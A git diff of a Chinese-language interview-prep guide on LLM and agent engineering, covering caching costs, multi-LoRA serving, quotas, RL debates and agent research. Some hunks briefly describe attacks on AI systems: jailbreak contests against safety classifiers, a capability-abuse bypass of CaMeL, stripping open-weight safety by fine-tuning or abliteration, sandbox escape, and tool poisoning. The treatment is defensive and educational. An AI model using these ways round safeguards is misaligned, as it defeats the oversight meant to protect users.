 | Memory Poisoning 与持久化攻击 | ⭐⭐ | 注入从一次性变为驻留；写入侧也要过 guardrail |
@@ -5754,7 +6028,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 **参考答案要点**：
 - **指令层级（Instruction Hierarchy，Wallace et al. 2024，arXiv:2404.13208）**：把指令按来源分优先级——系统/开发者指令 > 用户指令 > 第三方内容（工具返回、检索文档）；用合成数据微调让模型在冲突时优先高优先级指令。**直接针对"指令-数据不分"的根因做缓解**，对包括未见攻击类型在内的注入与越狱鲁棒性显著提升，且几乎不损能力。局限：是统计倾向不是硬规则，强自适应攻击仍可绕过；无法处理"高优先级指令本身有害"或合法第三方内容与攻击难分的情形。
 - **通用抗注入后训练**：把注入/越狱对抗样本纳入 RLHF/CAI 训练分布，提升整体拒绝鲁棒性；与指令层级常叠加使用。
-- **Constitutional Classifiers（Anthropic，2025.2）**：不改主模型，而是用"宪法"合成大量越狱/正常样本，训练**输入+输出成对分类器**包裹模型，专打**通用越狱**。实证：通用越狱 ASR 从约 86% 降到约 4.4%；原型 HackerOne 赛（183 名测试者、3000+ 小时、最高 $15K）无人破，但后续公开 demo 赛（339 名注册越狱者、30 万+ 对话、$10K/$20K 两档奖金）中一人被认定发现通用越狱并赢走 $20K；2026 下一代版本以级联分类器 + 激活检测大幅降本。
+- **Constitutional Classifiers（Anthropic，2025.2）**：不改主模型，而是用"宪法"合成大量越狱/正常样本，训练**输入+输出成对分类器**包裹模型，专打**通用越狱**。实证：通用越狱 ASR 从约 86% 降到约 4.4%；原型 HackerOne 赛（183 名测试者、3000+ 小时、最高 $15K）无人破，但后续公开 demo 赛（339 名注册越狱者、30 万+ 对话、$10K/$20K 两档奖金）中一人被认定发现通用越狱并赢走 $20K；代价是约 23.7% 的额外推理算力开销（论文口径是算力成本而非延迟）。
 - **能否根治？不能。** 三者本质都是概率性、可被自适应攻击绕过的"抬高门槛"手段：指令层级与抗注入训练受统计学习上限约束；分类器存在误杀-漏放权衡、自身可被对抗样本/投毒数据攻击，且对**针对性单点攻击**防护有限。正确定位：它们把攻击成本从"脚本小子"抬到"专业红队"，必须与应用层权限分离、Dual LLM、HITL 叠加。**没有任何单一模型层技术能替代"降爆炸半径"。**
 
 #### Q12【进阶】"对齐良好的模型"可以无条件信任吗？请谈 Reward Hacking、Sycophancy 与 Alignment Faking/欺骗性对齐对对齐可靠性的挑战。
@@ -5791,7 +6065,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
   - **越权拦截**：capability/权限凭证校验，命中即熔断（tripwire/interrupt），切断"不可信内容→特权动作"。
   - **结果过滤**：对工具返回内容做不可信标注与清洗（Spotlighting）、拦截外传模式，结果回灌前过护栏。
   - **调用后审计**：记录 provenance/权限/成本/失败证据，供对账、回归与事故复盘（标准化协议 MCP/A2A 把这部分责任进一步压给 G+O）。
-- **两条贯穿性约束**：①**capability-control 作为设计轴**——新增任何工具/记忆/对外通道，都要沿 tool schema/上下文策略/运行时权限/身份/可审计/人工批准六处同步加控制，而非事后"补个 guardrail"；②**E 层沙箱是安全边界**——代码执行强制隔离（gVisor/Firecracker/E2B）+ 资源限额 + 默认拒绝出网，呼应 SandboxEscapeBench（Marchand et al. 2026）"前沿模型可利用沙箱弱点、防御碎片化"的实测结论。
+- **两条贯穿性约束**：①**capability-control 作为设计轴**——新增任何工具/记忆/对外通道，都要沿 tool schema/上下文策略/运行时权限/身份/可审计/人工批准六处同步加控制，而非事后"补个 guardrail"；②**E 层沙箱是安全边界**——代码执行强制隔离（gVisor/Firecracker/E2B）+ 资源限额 + 默认拒绝出网，呼应 SandboxEscapeBench（Marchand et al. 2026，该基准名公开渠道不可核实，见 2.11 注记）"前沿模型可利用沙箱弱点、防御碎片化"的实测结论。
 - **收尾**：治理要与 T/C/L 各层**同期设计、同期测试**（综述观测治理覆盖普遍稀疏、常沦为事后补丁）；harness 应被读作**依赖结构**而非可拆组件清单——三子层 + 四 hook 点彼此依赖，缺任何一格都不是完整防御。
 
 ---
@@ -5818,6 +6092,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 18. **"CaMeL/Dual LLM 等设计级方案 = 完全解"**——CaMeL 2025.7 即被 capability-abuse 攻击部分绕过（不劫持控制流，用计划内合法授予的能力执行外传等恶意动作）。任何架构模式都有其威胁模型假设（Dual LLM 牺牲灵活性、Plan-Then-Execute 不适合强交互）；永恒的是"叠加 + 最小权限 + 持续 eval"，不是任何单一银弹。
 19. **"注入防御放在模型层（guardrails/过滤器）就够了"**——治理是三子层一等层：只有 model-level 而缺 system-level（网关/权限模型）与 organizational-level（审计/合规/HITL），以及工具循环的四个 hook 点（调用前校验/调用后审计/结果过滤/越权拦截）作为运行时执行抓手，模型层护栏一旦被绕过就再无第二道墙。把注入防御只放模型层，是 Harness 综述观测到的最常见结构性缺口（Table 4：治理覆盖普遍稀疏，常沦为事后补丁）。
 20. **"capability-control 就是'加个 guardrail'"**——反直觉：它是贯穿 tool schema/上下文策略/运行时权限/身份/可审计/人工批准的**设计轴**，不是安全附加项（§11.2）。更多能力=更大控制问题=更大爆炸半径；每扩一个工具/记忆/对外通道，都要沿这条轴同步扩控制，否则就是 capability abuse 的温床。把它当成上线前"补一个 guardrail"，恰好是治理沦为事后补丁的典型形态。
+21. **"自托管开源模型，靠模型自带对齐就够了"**——少量对抗微调（Qi et al. 2023）、前缀填充（浅层对齐）、abliteration（拒绝方向消融）任一手段都能剥离开源权重的安全行为。开源模型的对齐是"出厂默认值"不是安全边界，必须外部护栏 + 权限隔离兜底。
 
 ---
 
@@ -6040,10 +6315,10 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 **Provider 侧 Prompt Caching。** 以 [Anthropic Prompt Caching](https://docs.claude.com/en/docs/build-with-claude/prompt-caching)（2024-08 发布）为代表：
 
 - 用 `cache_control` 显式标记缓存断点（最多 4 个），**前缀精确匹配**——前缀内任何一处字节变动都会使其后全部失效；渲染顺序为 `tools → system → messages`；
-- **最小可缓存前缀因模型与代际而异**：Anthropic 侧横跨约 512–4096 token（新代际模型多为 512/1024，部分 Opus 4.x 与 Haiku 档为 2048/4096）；OpenAI 自动缓存为 1024；Gemini Context Caching 的下限高达 32,768（差一个量级，设计前缀长度时必须查所用模型的当前文档）。低于下限的前缀即使打断点也静默不缓存，需用 `usage.cache_creation_input_tokens` / `cache_read_input_tokens` 验证是否真的写入与命中；
+- **最小可缓存前缀因模型与代际而异**：Anthropic 侧横跨约 512–4096 token（新代际模型多为 512/1024，部分 Opus 4.x 与 Haiku 档为 2048/4096）；OpenAI 自动缓存为 1024；Gemini 的 32K 下限是 1.5 代口径，2.5 系起引入隐式缓存（约 1024/2048 token 起自动命中）且显式 Context Caching 下限已大幅降低——设计前缀长度前必查所用模型的当前文档。低于下限的前缀即使打断点也静默不缓存，需用 `usage.cache_creation_input_tokens` / `cache_read_input_tokens` 验证是否真的写入与命中；
 - 定价杠杆：**缓存写入 +25%（5 分钟 TTL）/ +100%（1 小时 TTL），缓存读取 −90%**；
 - 除逐块标注外，还支持顶层 `cache_control` 自动在最后一个可缓存块打断点（最省事的默认）；
-- OpenAI 走**自动缓存**路线（达到最小前缀自动命中，缓存输入约 −50%，无显式断点控制）；Gemini 提供显式的 Context Caching API（按缓存存储时长单独计费）。
+- OpenAI 走**自动缓存**路线（达到最小前缀自动命中，无显式断点控制），缓存读取折扣随代际加深：4o 代约 −50% → GPT-4.1 代 −75% → GPT-5 代约 −90%（缓存输入 $0.125 vs 未缓存 $1.25/MTok）；Gemini 提供显式的 Context Caching API（按缓存存储时长单独计费）。
 
 **回本线（统一口径，全章引用此推导）。** 以"窗口内该前缀被使用的总次数 k（首写 1 次 + 读 k−1 次）"计：不缓存成本为 k；缓存后 5 分钟 TTL 成本为 `1.25 + 0.1×(k−1)`，令其小于 k 得 **k ≥ 2，即首写之后在 5 分钟窗口内再被读 1 次即回本**（k=2：1.35 < 2.0）；1 小时 TTL 写入为 2×，同法得 **k ≥ 3（首写 + 2 次复用）**。前提有二：前缀字节稳定、复用发生在 TTL 窗口内——低频请求缓存必亏。
 
@@ -6068,6 +6343,10 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 3. **KV Cache 量化比权重量化更敏感于上下文**：FP8 KV 基本无损且省 2x 显存（等价于并发翻倍）；INT4 KV 风险显著（[KVQuant, NeurIPS'24](https://arxiv.org/abs/2401.18079) 指出粗暴 4-bit 会不可接受地掉点），且晚层比早层更敏感。
 4. **架构级省存优先于比特级省存**：在纠结 4-bit 还是 8-bit 之前，先看模型是否用了 GQA/MLA（见 §1）——MLA 把 KV 压进低秩潜空间带来的省存，往往比 KV 量化更彻底且无精度代价。量化与结构压缩是正交的两条线，可以叠加。
 5. **FP4 已上桌（2025–2026 时效点）**：Blackwell 原生支持 NVFP4/MXFP4 两种 micro-scaling 4-bit 格式（每个小块共享一个缩放因子），TensorRT-LLM 与 vLLM 均已支持，B200 上算力较 FP8 再约翻倍。但激活压到 4-bit 的精度敏感度显著高于 FP8，需要精细校准与逐任务回归——定位是"Blackwell 上的新甜点候选"，而非可直接无脑替换 FP8 的默认项。
+
+#### Multi-LoRA Serving：一份底模同时服务上千个租户
+
+**考点**：多租户定制场景下，给每个客户各部署一份微调模型显存上完全不可行；解法是**共享一份底模，按请求动态挂载各租户的 LoRA adapter**（与第 1 章 §2.7 呼应：那边讲 LoRA 怎么训，这边讲上千个 LoRA 怎么一起 serve）。**机制三件套**：① [S-LoRA](https://arxiv.org/abs/2311.03285) 的 **unified paging**——把 adapter 权重与 KV Cache 放进同一个分页显存池统一管理（PagedAttention 思路的推广），热 adapter 驻 GPU、冷的留在主存按需换入；② [Punica](https://arxiv.org/abs/2310.18547) 的 **SGMV CUDA kernel**——让**同一个异构 batch 里不同请求走不同 adapter** 也能合并为一次分组矩阵乘，不必按 adapter 拆 batch，continuous batching 的吞吐收益得以保留（vLLM 的 multi-LoRA 即基于此路线产品化：启用 LoRA 后按请求指定 adapter，运行时动态加载/卸载）。**高频追问**：(1) 第 1 章说 LoRA "可合并、零延迟"，这里为何不合并？——合并后底模即被单一租户独占、失去共享；multi-LoRA 走"不合并、推理时额外算低秩旁路"路线，代价是每 token 多一点计算，换来一卡服务成百上千租户；(2) **冷加载延迟**：请求命中未驻留的 adapter 要付一次换入延迟，工程上用**租户级 adapter 路由**（同租户请求粘到已缓存其 adapter 的实例，与 §5 的 KV-aware 路由同思路）+ LRU 驻留 + 热门 adapter 预加载治理；(3) 与量化正交可叠加：量化底模 + bf16 adapter 是常见组合（正对应第 1 章的 QLoRA 训练路线）。
 
 #### 7. 投机解码：用并行验证换自回归串行
 
@@ -6183,6 +6462,15 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 - **超时**：区分 per-attempt timeout 与总 deadline；decode 时间随输出长度（含思维 token）线性增长，超时应基于预估输出长度动态设置，流式场景用"inter-token 间隔超时"（如 30s 无新 token 则判死）比总超时更合理；
 - **熔断**：错误率超阈值 → open（快速失败，保护下游）→ half-open（试探恢复）；按 provider/model 维度独立建熔断器；
 - **Fallback 链**：主模型 → 同族降级模型（保格式兼容）→ 跨 provider → 缓存/静态兜底。注意降级模型的能力边界：tool-calling schema、上下文长度、指令遵循度、思维能力都可能不兼容，fallback 必须经过等价测试而非"能连通就行"。
+
+#### Provider 配额与预留容量：从"被动挨 429"到"主动买容量"
+
+**考点**：限流四件套回答"超限了怎么办"，容量规划还要回答"配额从哪来"——两半合起来才是完整故事。
+
+- **Rate limit tier 体系**：OpenAI/Anthropic 都按累计用量与付费记录自动升 tier，tier 越高解锁越高的 RPM/TPM。新账号的低 tier 是压测和上量前的隐形墙——容量规划第一步是确认当前 tier 与升级路径，而不是先写重试逻辑。
+- **预留容量**：Azure OpenAI 的 **PTU**（Provisioned Throughput Units）与 AWS Bedrock 的 **Provisioned Throughput** 走"月租换确定性"路线：预付固定费用买断专属吞吐，换取稳定延迟与容量保障（不与共享池抢容量，429 基本消失）；利用率足够高时，有效单价可低于按量计费。
+- **决策框架（追问必答）**：稳定基线负载 → 预留（延迟稳、可预算、单价可更低）；突发尾部 → 按量 + 多账号/多区域分片摊开配额 + **spillover**（预留打满时溢出到按量池/次选区域）；容量规划的输入是**峰值 TPM 预测**（含 Agent 扇出与思维 token），不是平均值。
+- **与本节衔接**：429/Retry-After、熔断、fallback 链是被动防御，配额分片与预留是主动供给侧规划——先把容量买对、摊开，429 才是异常而非常态；spillover 本质上就是一条"容量维度的 fallback 链"。
 
 #### 13. 流式输出
 
@@ -6306,6 +6594,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 | 长程 Agent 的上下文管理（compaction/editing/预算） | ⭐⭐ | Agent 系统设计题的新核心 |
 | 语义缓存的命中率现实与正确性风险 | ⭐⭐ | 反直觉题，考工程判断力 |
 | 重试/熔断/Fallback 在 LLM 场景的特殊性 | ⭐⭐ | 可靠性题，非幂等性是题眼 |
+| Provider 配额 tier 与预留容量（PTU / Provisioned Throughput） | ⭐ | 容量规划加分项：稳定基线买预留、突发按量+spillover，见 §12 |
 | Agent 引擎的 checkpoint / HITL / 预算 | ⭐⭐ | 系统设计题骨架 |
 | FlashAttention 与注意力访存瓶颈 | ⭐⭐ | "attention 为什么慢、FA 省了什么"，FA3/FlashInfer 是加分点 |
 | 可观测性与 eval 体系（含 judge 偏置校准） | ⭐⭐ | "Demo 到生产"题的标准落点 |
@@ -6366,7 +6655,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 **答题思路**：先报价格杠杆，再讲 Agent 场景的上下文膨胀问题与前缀工程，最后讲盈亏平衡。
 
 **参考答案要点**：
-- 计费：显式 `cache_control` 断点（≤4 个），前缀精确匹配，渲染顺序 tools→system→messages；最小可缓存前缀**因模型与代际而异**（Anthropic 横跨约 512–4096 token，新代际多为 512/1024，部分 Opus 4.x/Haiku 档为 2048/4096；OpenAI 自动缓存 1024；Gemini Context Caching ≥32K），过短前缀静默不缓存，需看 usage 中 cache_creation/cache_read 是否非零。**写入 +25%（5min TTL）/+100%（1h TTL），读取 −90%**。OpenAI 为自动缓存、约 −50%、无显式控制；两者口径不同但思路一致。
+- 计费：显式 `cache_control` 断点（≤4 个），前缀精确匹配，渲染顺序 tools→system→messages；最小可缓存前缀**因模型与代际而异**（Anthropic 横跨约 512–4096 token，新代际多为 512/1024，部分 Opus 4.x/Haiku 档为 2048/4096；OpenAI 自动缓存 1024；Gemini 2.5 系起有隐式缓存、约 1024/2048 起自动命中，显式下限以当前文档为准），过短前缀静默不缓存，需看 usage 中 cache_creation/cache_read 是否非零。**写入 +25%（5min TTL）/+100%（1h TTL），读取 −90%**。OpenAI 为自动缓存、无显式控制，折扣随代际加深（4o 代约 −50% → GPT-4.1 代 −75% → GPT-5 代约 −90%）；两者口径不同但思路一致。
 - Agent 场景：每步重发完整历史，输入 token 随步数线性膨胀，成本是 O(steps²) 级隐患。缓存命中后第 2 步起绝大部分输入按 10% 计价，前缀占比高的 Agent 负载实测通常省 30–80%。
 - 工程做法：把稳定内容（system、工具定义、静态文档）放最前并打断点；动态内容（用户输入、时间戳、请求 ID）尽量后置；避免在缓存段内插入任何变动字段（含工具列表顺序变动）；中途运营指令追加到消息序列而非改写顶层 system；多轮对话把历史追加在缓存段之后。
 - 亏钱情形：命中率低时，每次写入的 25%–100% 溢价反而抬高成本——缓存是"赌复用"的机制。回本线（k = 首写 + 窗口内读取次数）：5min TTL 需 k≥2（首写后再复用 1 次：1.25+0.1=1.35 < 2.0），1h TTL 需 k≥3；低频请求必亏。
@@ -6565,12 +6854,12 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 │   └── 开源阵营入局：Qwen3/QwQ、GLM-4.5/4.6、Kimi K2/K2 Thinking、DeepSeek-V3.2（DSA 稀疏注意力 + thinking-in-tool-use）、gpt-oss
 │
 ├── 3. Agent 产品形态与研究线（2025–2026）
-│   ├── Deep Research（Perplexity/OpenAI 2025.2、Anthropic Research 2025.3、ChatGPT Agent 2025.7）
+│   ├── Deep Research（Perplexity/OpenAI 2025.2、Anthropic Research 2025.4、ChatGPT Agent 2025.7）
 │   ├── Coding Agent：Claude Code、OpenAI Codex（2025.5）、Devin、Cursor 2.0/Windsurf、Gemini CLI/Jules/Antigravity、开源 OpenHands/Aider/Cline；harness（脚手架）竞争
 │   ├── Computer Use 产品：Operator（2025.1）→ ChatGPT Agent、Gemini Computer Use；开源 GUI 基础模型 UI-TARS 系列
 │   ├── GUI grounding 学术线：Mind2Web / WebArena / WebVoyager（评测）+ SeeAct / OS-Atlas / ShowUI（方法）
 │   ├── 多 Agent 学术线：CAMEL（角色扮演）/ MetaGPT（SOP + 产物共享）/ ChatDev（软件公司模拟）/ AgentVerse（涌现行为）
-│   ├── 科研/进化 Agent：AlphaEvolve（DeepMind 2025.5）、AI Scientist 谱系
+│   ├── 科研/进化 Agent：AlphaEvolve（DeepMind 2025.5）、AI co-scientist（Google 2025.2）、AI Scientist 谱系
 │   └── Context Engineering：从 prompt engineering 进化而来的核心工程学科
 │
 ├── 4. Agent 训练：Agentic RL（2024–2026 最热研究方向）
@@ -6734,7 +7023,7 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 
 **OpenAI Deep Research（2025.2.2）。** 基于 o3 微调的浏览与数据分析 agent：自主制定研究计划 → 多轮网页搜索/抓取 → 跨源综合 → 生成带引用的长报告。GAIA 约 67.3%（one-shot），Humanity's Last Exam（带工具）26.6%（此前模型约 3%），BrowseComp（2025.4，高难浏览基准）51.5%。它把"reasoning + browsing + 长程规划"第一次打包成大众产品，催生了"Deep Research"品类（Perplexity、Gemini Deep Research 等迅速跟进）。
 
-**Anthropic Research（2025.3）。** 产品发布后，工程博客《How we built our multi-agent research system》（2025.6）披露了 **orchestrator-worker 架构**：lead agent 规划并把查询拆给并行 subagent，worker 独立搜索后回传浓缩结果，lead 综合成文。关键数据：GAIA 72.5%；**token 用量单独解释了评测分数方差的 80%**；agent 用 token 约为聊天的 4 倍，多 agent 系统约为 **15 倍**。工程教训：有状态长程运行会放大一切故障，需要 tracing、checkpoint、可恢复进度、rainbow deployment；用 LLM-as-judge 按事实性/引用/覆盖度/信源可信度打分，再辅以人工抽查。
+**Anthropic Research（2025.4）。** 产品发布后，工程博客《How we built our multi-agent research system》（2025.6）披露了 **orchestrator-worker 架构**：lead agent 规划并把查询拆给并行 subagent，worker 独立搜索后回传浓缩结果，lead 综合成文。关键数据：GAIA 72.5%；**token 用量单独解释了评测分数方差的 80%**；agent 用 token 约为聊天的 4 倍，多 agent 系统约为 **15 倍**。工程教训：有状态长程运行会放大一切故障，需要 tracing、checkpoint、可恢复进度、rainbow deployment；用 LLM-as-judge 按事实性/引用/覆盖度/信源可信度打分，再辅以人工抽查。
 
 **面试视角。** Deep Research 是"系统设计题"的绝佳素材（见第 4 节），也是理解 **test-time scaling 经济学**的样本：性能可以通过多花 token 稳定买到，问题变成"花得值不值"。
 
@@ -6770,6 +7059,16 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 
 **第三路线（2025 新动向）。** SFT 与 RL 之间出现了 **on-policy distillation**（Thinking Machines，2025.10）：用学生模型自己生成的轨迹采样、以教师模型的逐 token 概率作密集反馈来蒸馏——成本远低于 RL、信号远比 SFT 密集，且 rollout 天然 on-policy，与 agent 训练高度契合，可作为"先蒸馏预热、再 RL 收尾"的中间环节。
 
+#### RLVR 能力边界之争：提升能力还是采样效率？
+
+**争论起点。** Yue et al.《Does RL Really Incentivize Reasoning Capacity in LLMs Beyond the Base Model?》（2025.4，[arXiv:2504.13837](https://arxiv.org/abs/2504.13837)）给 RLVR 泼了一盆冷水：RLVR 模型的 pass@1 显著更高，但把采样数 k 放大后，**base model 的 pass@k 反超 RL 模型**（pass@k crossover），且 RL 模型能解的题几乎都落在 base model 的采样分布内。结论：**RLVR 主要是收窄采样分布、提升采样效率，推理能力上界仍受 base model 限制**——"RL 教不出 base 采不出来的解"。
+
+**反方证据。** NVIDIA **ProRL**（2025.5，[arXiv:2505.24864](https://arxiv.org/abs/2505.24864)）：把 RL 拉长到数千步的**长期稳定训练**，用 KL 正则控制偏移 + **参考策略定期重置**维持探索，在 base model pass@k≈0 的任务上学出了新解法——说明"学不出新能力"不是 RLVR 的宿命，而是训练时长与探索维持不足的产物。
+
+**截至 2026 年中的中间共识。** 两派测的其实是不同工况：短期、小规模、易熵坍缩的 RL 确实主要是采样效率提升；**能否越过 base 边界，取决于训练时长、数据多样性与探索维持机制**（熵控制、参考策略重置、动态采样——正是 DAPO/ProRL 这类修补的用武之地）。
+
+**面试答法。** 先报两派论文与各自证据（pass@k crossover vs ProRL 在 base 采不出的任务上学出新解），再给条件化结论，最后互引：本节的熵坍缩与 DAPO 修补是这场分歧的技术根源，2.10 的"evaluator 质量决定进化上限"是同一问题在自我进化侧的镜像。
+
 #### 2.10 自我进化（Self-Evolving Agents）
 
 **框架。** 2025 年综述（[arXiv:2507.21046](https://arxiv.org/abs/2507.21046)）把自我进化刻画为**四阶段闭环**：experience accumulation（积累轨迹与反馈）→ experience refinement（提炼去噪）→ updating（更新自身）→ deployment（再收集），并按**进化对象**分类：
@@ -6782,12 +7081,21 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 
 **资深视角的取舍。** 自我进化听起来美，但落地的几乎都是"**进化记忆/工作流**"这种不动权重的轻量形态——因为在线动权重面临灾难性遗忘、评测成本与安全审计难题。面试中能区分三种时间尺度，并指出"evaluator 质量决定进化上限"，就是高分答案。
 
+#### 科研/发现型 Agent：进化闭环的高价值落地
+
+自我进化闭环在**科学发现**场景已拿到硬结果，是这条线最有说服力的落地：
+- **AlphaEvolve**（DeepMind，2025.5）：LLM 生成程序变体 + **自动 evaluator 打分** + 进化搜索留优——FunSearch 路线的放大版。硬成果：发现 **4×4 复数矩阵乘法的 48 次乘法算法**（56 年来首次改进该设定下 Strassen 的 49 次纪录），并优化 Google 数据中心调度（回收约 0.7% 全球算力）、TPU 电路与训练内核；
+- **AI co-scientist**（Google，2025.2）：多智能体**假说"生成—辩论—进化"**系统（生成/反思/排名/进化等角色 + 锦标赛式 Elo 排名），已有药物再利用（白血病方向）等**湿实验验证**的假说产出；
+- **Sakana AI Scientist**（2024.8 起）：端到端"选题—实验—写论文—自动评审"的争议线，v2 的一篇论文 2025 年通过 ICLR workshop 同行评审（按约定事后撤回）——"AI 论文该不该投"的评审伦理争论由此而起。
+
+**核心考点。** 成败判据与上文完全同构：**evaluator 质量决定上限**——AlphaEvolve 只在结果可自动验证（数学构造、调度指标、电路面积）的领域拿到硬成果，假说生成类系统仍需人类与湿实验收尾。一句话：**可自动验证的领域会先被进化式 agent 吃掉；不可验证领域的瓶颈不在生成，而在评估。**
+
 #### 2.11 世界模型（World Models）
 
 **两条路线。**
 - **观测级生成式**：预测未来像素/视频帧。DreamerV3（2023，用同一超参在 Minecraft 从零挖到钻石）→ DeepMind **Genie 3**（2025.8，720p、24fps、分钟级一致性的**可交互**实时环境生成，支持 promptable world events，已成为训练具身 agent 的仿真器候选）→ NVIDIA **Cosmos**（2025.1，[arXiv:2501.03575](https://arxiv.org/abs/2501.03575)，面向机器人与自动驾驶的世界基础模型）→ World Labs **Marble**（2025.11，从图像/文本生成可探索的 3D 世界）。Sora 发布时也被称为"世界模拟器"，但学界对其是否真学到物理仍有争议。
 - **潜空间预测式（JEPA 谱系）**：LeCun 路线，只在压缩表征空间预测，放弃逐像素重建，避免把建模容量浪费在不可预测的高频细节上。**V-JEPA 2**（Meta FAIR，2025.6，[arXiv:2506.09985](https://arxiv.org/abs/2506.09985)，1.2B 参数、约 100 万小时视频预训练）学到的潜空间动力学可直接用于机器人**零样本规划**（想象-行动循环）。
-- **互补的 VLA 分支**：RT-2 → Physical Intelligence **π0/π0.5**（[arXiv:2410.24164](https://arxiv.org/abs/2410.24164)）→ NVIDIA **GR00T**（[arXiv:2503.14734](https://arxiv.org/abs/2503.14734)），把"感知—语言—动作"端到端接成策略网络；世界模型提供"会发生什么"，VLA 提供"该做什么"，两者在 model-based planning 中合流。
+- **互补的 VLA 分支**：RT-2 → Physical Intelligence **π0**（2024.10，[arXiv:2410.24164](https://arxiv.org/abs/2410.24164)）与 **π0.5**（2025.4，[arXiv:2504.16054](https://arxiv.org/abs/2504.16054)，开放世界泛化）→ NVIDIA **GR00T**（[arXiv:2503.14734](https://arxiv.org/abs/2503.14734)），把"感知—语言—动作"端到端接成策略网络；世界模型提供"会发生什么"，VLA 提供"该做什么"，两者在 model-based planning 中合流。
 
 **为什么对 Agent 重要。** 世界模型 = **内置仿真器**：agent 可在想象中 rollout 多条轨迹再行动（model-based planning / latent MPC），把昂贵的真实试错转为便宜的"心理模拟"。这也是从"语言 agent"走向"具身 agent"的关键缺口：LLM 擅长符号规划，但对物理后果的预测很差。面试题常问"LLM 算不算世界模型"——参考答案：LLM 隐含了部分世界知识（Othello-GPT 等证据），但缺乏动作条件化、持续更新的状态表征，与严格意义的世界模型不同。
 
@@ -6815,10 +7123,12 @@ Agent 相比普通 LLM 应用新增了四块攻击面：**工具（能改变世�
 **趋势三：单 agent vs 多 agent 之争论出结果。** Cognition《Don't Build Multi-Agents》（2025.6.3）主张上下文共享是命门，**并行子 agent 互相看不到对方的动作与推理**，容易写出互相冲突的改动；约两周后（2025.6.20）Anthropic 用 Research 系统证明：**可并行、且瓶颈是 token 吞吐**的任务上，orchestrator-worker 显著更强（代价 15× token）。2026.4.22 Cognition 发文修正立场（《Multi-Agents: What's Actually Working》），但**承认跑通的主要是只读/评审/map-reduce 类场景，前提仍是"写操作保持单线程、helper 只提供智能而不执行动作"**——这是口径收窄的条件化共识，而非全面转向。收敛结论（LangChain 2025.6 的中立分析亦同）：多 agent 不是架构偏好问题，而是**任务可并行性 × token 预算 × 上下文耦合度**的函数——**"贡献智能"的决策链保持单线程共享上下文，"贡献算力"的并行 worker（搜索、批处理、隔离沙箱）可以多开**；Kimi K2.5 的 PARL 则预示下一步：连"何时拆分、如何编排"都由 RL 学出来。学术线的早期证据见 2.16。
 
 **趋势四：评测方法论成熟与 Agent 安全工程化。**
-- **评测**：agent 输出高方差，单次分数误导——**pass^k（k 次全部通过）与多 seed 方差**成为标配（τ²-bench 2025.6 正式提出 pass^k，[arXiv:2506.07982](https://arxiv.org/abs/2506.07982)，新增双控制与 telecom 域；τ³-bench 2026 再加全双工语音与知识任务，[arXiv:2603.13686](https://arxiv.org/abs/2603.13686)，语音成绩仅约文本的 30–45%；截至 2026 年年中，τ²-bench 总榜榜首 pass^1 已超 90%，易域近饱和）；**预算对齐**（token/时间/重试次数统一）；**防污染**（SWE-rebench/SWE-bench-Live 滚动出新题）；评测执行者本身也在 agent 化——**Agent-as-a-Judge**（[arXiv:2410.10934](https://arxiv.org/abs/2410.10934)）让 agent 评 agent，同时要管控 judge 偏差（位置、冗长、自我偏好）；**METR 时间地平线**（2025.3，[arXiv:2503.14499](https://arxiv.org/abs/2503.14499)）：50% 可靠完成的任务时长按**约 7 个月翻倍**（编码任务子集的翻倍周期估计更短，约 4–5 个月，随统计口径有别），成为衡量"agent 能干多长任务"的行业标尺；
+- **评测**：agent 输出高方差，单次分数误导——**pass^k（k 次全部通过）与多 seed 方差**成为标配（pass^k 由 2024.6 原版 τ-bench 提出，[arXiv:2406.12045](https://arxiv.org/abs/2406.12045)；τ²-bench 2025.6 沿用并扩展，[arXiv:2506.07982](https://arxiv.org/abs/2506.07982)，新增双控制与 telecom 域；τ³-bench 2026 再加全双工语音与知识任务，[arXiv:2603.13686](https://arxiv.org/abs/2603.13686)，语音成绩仅约文本的 30–45%；截至 2026 年年中，τ²-bench 总榜榜首 pass^1 已超 90%，易域近饱和）；**预算对齐**（token/时间/重试次数统一）；**防污染**（SWE-rebench/SWE-bench-Live 滚动出新题）；评测执行者本身也在 agent 化——**Agent-as-a-Judge**（[arXiv:2410.10934](https://arxiv.org/abs/2410.10934)）让 agent 评 agent，同时要管控 judge 偏差（位置、冗长、自我偏好）；**METR 时间地平线**（2025.3，[arXiv:2503.14499](https://arxiv.org/abs/2503.14499)）：50% 可靠完成的任务时长按**约 7 个月翻倍**（编码任务子集的翻倍周期估计更短，约 4–5 个月，随统计口径有别），成为衡量"agent 能干多长任务"的行业标尺；
 - **安全**：prompt injection（网页/文件/邮件中的文字即指令）、MCP **tool poisoning**（恶意工具描述注入）、跨工具数据外泄成为头号威胁；工程对策收敛为：**最小权限 + 凭据隔离、沙箱/网络白名单、不可逆操作人审闸门、全链路 tracing 与预算熔断、红队与注入评测作为发布门槛**。研究级防御与攻防基准见 §2.17。共识：注入没有"靠模型变聪明"的终极解，只有**限制爆炸半径 + 行为可审计可撤销**。
 
-#### 2.13 推理模型与 Test-time Scaling：Agent 的能力底座
+**两篇 2025 立场论文（观点弹药）。**
+- **Silver & Sutton《Welcome to the Era of Experience》**（2025.4）：宣言式立场——高质量人类数据渐趋耗尽，**agent 与环境交互产生的"经验流"将超越人类数据成为主导数据源**，RL 回归主线。为 agentic RL 与自我进化提供叙事框架，谈"训练数据从哪来"时的标准引用；
+- **NVIDIA《Small Language Models are the Future of Agentic AI》**（2025.6，[arXiv:2506.02153](https://arxiv.org/abs/2506.02153)）：agent 子任务**窄而重复**，SLM 足够胜任且成本/延迟优势达数量级，LLM 只留给规划与兜底——**异构 agent 系统**（大模型编排 + 小模型执行）的经济学论证，讨论成本优化与模型选型时引用。
 
